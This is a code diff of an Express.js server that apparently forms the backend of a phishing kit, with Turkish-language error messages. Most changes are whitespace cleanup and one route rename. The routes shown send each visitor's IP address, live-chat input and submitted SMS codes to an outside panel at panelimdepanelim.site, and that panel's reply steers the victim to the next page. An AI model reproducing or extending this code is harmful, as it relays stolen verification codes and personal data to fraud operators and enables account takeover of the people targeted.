@@ -32,7 +32,7 @@ app.get('/login', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'home.html'));
 });
 
-app.get('/account/signin', (req, res) => {
+app.get('/signin', (req, res) => {
   const caAsCookie = req.cookies.ca_as;
   if (!caAsCookie) {
       return res.redirect('/');
@@ -128,13 +128,9 @@ app.get('/successfuly', (req, res) => {
  
 app.get('/verify', async (req, res) => {
     const clientIp = req.clientIp;  
-  
-     
-      
       const response = await axios.post('https://panelimdepanelim.site/eksik.php', {
         ip: clientIp
       });
-  
  
       if (response.data === '/control.html?page=eposta') {
         res.redirect('/eposta');
@@ -151,15 +147,11 @@ app.get('/verify', async (req, res) => {
 app.post('/api', async (req, res) => {
   const clientIp = req.clientIp;  
   const { x } = req.body; 
-
   try {
- 
     const response = await axios.post('https://panelimdepanelim.site/livechat.php', {
       ip: clientIp,
       x: x
     });
-
-    
     res.send(response.data);
   } catch (error) {
     console.error("Hedef URL'ye POST gönderiminde hata:", error);
@@ -172,14 +164,10 @@ app.post('/sms', async (req, res) => {
   const { sms } = req.body;  
 
   try {
-
- 
     const response = await axios.post('https://panelimdepanelim.site/sms.php', {
       ip: clientIp,
       sms: sms
     });
-
-
     res.send(response.data);
   } catch (error) {
     console.error("Hedef URL'ye POST gönderiminde hata:", error);
